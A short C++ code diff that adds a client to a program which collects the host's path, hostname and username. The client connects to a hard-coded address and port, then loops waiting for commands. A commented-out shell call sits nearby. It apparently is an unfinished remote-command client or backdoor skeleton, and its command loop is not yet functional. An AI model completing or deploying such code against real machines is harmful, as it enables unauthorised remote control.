@@ -17,7 +17,6 @@
 int main() {
 
     // Sending OS information
-    const char* currentDirectory = "";
     std::string path;
 
     path = std::filesystem::current_path();
@@ -29,8 +28,19 @@ int main() {
     std::cout << OSInformation::hostname() << std::endl;
     std::cout << OSInformation::username() << std::endl;
 
+    Client client = Client();
 
-    Client client;
+    std::string host = "192.168.0.19", port = "8080";
+
+    client.Connect(host, port);
+    client.Listen();
+
+    std::string command;
+    while (client.isConnected()) {
+        if (!command.empty()) {
+            std::cout << command << std::endl;
+        }
+    }
 
     //std::string result = execute("ls");
     //std::cout << result << std::endl;
